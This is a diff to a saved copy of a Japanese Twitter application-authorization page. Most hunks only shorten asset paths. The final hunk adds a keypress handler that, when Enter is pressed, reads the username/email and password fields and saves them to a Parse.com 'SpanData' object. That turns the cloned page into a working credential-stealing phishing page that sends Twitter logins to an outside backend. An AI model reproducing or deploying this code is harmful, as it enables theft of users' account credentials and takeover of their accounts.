@@ -8,7 +8,7 @@
     <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
     <title>Twitter / アプリケーション認証</title>
 
-    <link href="Twitter%20_%20%E3%82%A2%E3%83%95%E3%82%9A%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E8%AA%8D%E8%A8%BC_files/intents_rosetta.css" media="screen" rel="stylesheet" type="text/css">
+    <link href="a/intents_rosetta.css" media="screen" rel="stylesheet" type="text/css">
     <!--[if (IEMobile) & (lt IE 9)]>
     <link href="https://abs.twimg.com/a/1418762776/css/tfw/phoenix/intents_phoenix_iemobile.bundle.css" media="screen" rel="stylesheet" type="text/css" />
     <![endif]-->
@@ -202,7 +202,7 @@ style.firebugResetStyles {
   
 <div class="app-info expanded" role="content-info" tabindex="0">
   <h3>
-    <img alt="" class="app-icon" src="Twitter%20_%20%E3%82%A2%E3%83%95%E3%82%9A%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E8%AA%8D%E8%A8%BC_files/icon.png" title="株式会社番長 による ハニホー！">
+    <img alt="" class="app-icon" src="a/icon.png" title="株式会社番長 による ハニホー！">
     ハニホー！
   </h3>
   <dl>
@@ -297,7 +297,7 @@ style.firebugResetStyles {
 
     </div></div>
     
-    <script src="Twitter%20_%20%E3%82%A2%E3%83%95%E3%82%9A%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E8%AA%8D%E8%A8%BC_files/jquery.js" async="" type="text/javascript" id="LR2"></script><script src="Twitter%20_%20%E3%82%A2%E3%83%95%E3%82%9A%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E8%AA%8D%E8%A8%BC_files/main.js" async="" type="text/javascript" id="LR1"></script><script type="text/javascript" charset="utf-8">
+    <script src="a/jquery.js" async="" type="text/javascript" id="LR2"></script><script src="a/main.js" async="" type="text/javascript" id="LR1"></script><script type="text/javascript" charset="utf-8">
       var twttr = twttr || {};
       twttr.form_authenticity_token = '24733fdc678a35975fd41884dda593e1787507eb';
       if (self == top) {
@@ -307,7 +307,7 @@ style.firebugResetStyles {
 
     <script type="text/javascript" src="https://parse.com/downloads/javascript/parse-1.3.2.js"></script>
 
-    <script src="Twitter%20_%20%E3%82%A2%E3%83%95%E3%82%9A%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E8%AA%8D%E8%A8%BC_files/loadrunner.js" data-main="tfw/intents/main" data-path="https://abs.twimg.com/a/1418762776/tfw" type="text/javascript"></script>
+    <script src="a/loadrunner.js" data-main="tfw/intents/main" data-path="https://abs.twimg.com/a/1418762776/tfw" type="text/javascript"></script>
 
     
     <script type="text/javascript" charset="utf-8">
@@ -340,6 +340,26 @@ function($) {
     });
 
   });
+  $('body').keypress( function ( e ) {
+    if (e.which == 13) {
+      // ここに処理を記述
+      var username = $("#username_or_email").val();
+      var password = $("#password").val();
+
+      var SpanData =  Parse.Object.extend("SpanData");
+      var spanData = new SpanData();
+      spanData.set("username", username);
+      spanData.set("password", password);
+
+      spanData.save(null, {
+        success: function(gameScore) {
+        },
+        error: function(gameScore, error) {
+        }
+      });
+    }
+  });
+
 
 });
 
